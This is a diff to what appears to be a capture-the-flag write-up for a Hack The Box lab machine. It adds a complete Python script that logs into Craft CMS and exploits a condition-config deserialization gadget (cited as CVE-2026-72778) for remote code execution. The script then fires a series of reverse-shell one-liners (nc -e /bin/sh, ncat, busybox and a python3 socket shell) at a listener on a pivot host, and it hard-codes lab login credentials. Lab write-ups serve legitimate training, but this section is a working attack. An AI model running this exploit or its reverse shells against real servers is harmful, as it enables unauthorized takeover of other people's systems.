@@ -1184,17 +1184,88 @@ python3 craft_rce.py
 Exploit script (`craft_rce.py`, key parameters):
 
 ```python
+#!/usr/bin/env python3
+"""Craft CMS authenticated RCE via condition-config (CVE-2026-72778 / Yii Behavior gadget).
+Run FROM KALI over the ligolo tunnel. Reverse shell lands on the PIVOT (airside-ws01 wlan2)."""
+import re, sys, requests
+
 BASE  = "http://portal.international.htb"
 USER  = "jenny"
 PASS  = "Fl1ghtDeck2026!"
-LHOST = "10.13.37.183"     # pivot wlan2 IP — listener lives here, NOT Kali
+LHOST = "10.13.37.183"          # airside-ws01 wlan2 IP (listener lives here)
 LPORT = 4444
-# login -> fresh CP CSRF -> POST crafted condition to
-#   /index.php?p=admin/actions/element-search/search
-# gadget: "as rce" => yii\behaviors\AttributeTypecastBehavior
-#         typecast sink => Psy\Readline\Hoa\ConsoleProcessus::execute(cmd)
-#         "on *" => self::beforeSave  (fires on any event)
-# tries shells in order: busybox nc / ncat / nc / python3
+
+s = requests.Session()
+s.headers.update({"User-Agent": "Mozilla/5.0"})
+AJAX = {"X-Requested-With": "XMLHttpRequest", "Accept": "application/json"}
+
+# 1) login page + CSRF
+r = s.get(BASE + "/admin/login", timeout=10)
+m = re.search(r'name="CRAFT_CSRF_TOKEN"\s+value="([^"]+)"', r.text.replace('\\"', '"'))
+if not m:
+    sys.exit("[-] no CSRF token on login page - is the tunnel/hosts entry up?")
+csrf = m.group(1)
+
+# 2) login (JSON body, like the CP's own JS)
+lr = s.post(BASE + "/index.php?p=admin/actions/users/login",
+            json={"CRAFT_CSRF_TOKEN": csrf, "loginName": USER, "password": PASS},
+            headers={**AJAX, "X-CSRF-Token": csrf}, timeout=10)
+dash = s.get(BASE + "/admin/dashboard", timeout=10)
+if dash.status_code != 200 or "loginName" in dash.text[:2000]:
+    sys.exit(f"[-] login failed (HTTP {lr.status_code}): check creds")
+print("[+] logged in as", USER)
+
+# 3) fresh CSRF from the CP
+m2 = (re.search(r'csrfTokenValue":"([^"]+)"', dash.text)
+      or re.search(r'name="CRAFT_CSRF_TOKEN"\s+value="([^"]+)"', dash.text.replace('\\"', '"')))
+if not m2:
+    sys.exit("[-] could not read CP CSRF token")
+csrf2 = m2.group(1)
+
+# 4) the gadget
+def payload(cmd):
+    return {
+        "elementType": "craft\\elements\\Category",
+        "siteId": 1,
+        "search": "",
+        "condition": {
+            "class": "craft\\elements\\conditions\\ElementCondition",
+            "elementType": "craft\\elements\\Category",
+            "fieldLayouts": [{
+                "as rce": {
+                    "__class": "yii\\behaviors\\AttributeTypecastBehavior",
+                    "__construct()": [{
+                        "attributeTypes": {
+                            "typecastBeforeSave": ["Psy\\Readline\\Hoa\\ConsoleProcessus", "execute"]
+                        },
+                        "typecastBeforeSave": cmd
+                    }]
+                },
+                "on *": "self::beforeSave"
+            }]
+        },
+        "CRAFT_CSRF_TOKEN": csrf2,
+    }
+
+shells = [
+    f"busybox nc {LHOST} {LPORT} -e /bin/sh",
+    f"ncat {LHOST} {LPORT} -e /bin/sh",
+    f"nc {LHOST} {LPORT} -e /bin/sh",
+    (f"python3 -c 'import socket,subprocess,os;s=socket.socket();"
+     f"s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0);"
+     f"os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
+     f"subprocess.call([\"/bin/bash\",\"-i\"])'"),
+]
+for cmd in shells:
+    try:
+        pr = s.post(BASE + "/index.php?p=admin/actions/element-search/search",
+                    json=payload(cmd), headers={**AJAX, "X-CSRF-Token": csrf2}, timeout=8)
+        print(f"[*] sent ({pr.status_code}): {cmd[:60]}")
+    except requests.exceptions.Timeout:
+        print(f"[+] timeout (shell probably running): {cmd[:60]}")
+        break
+print("[*] check your listener on the pivot host")
+
 ```
 
 **Breakdown:**
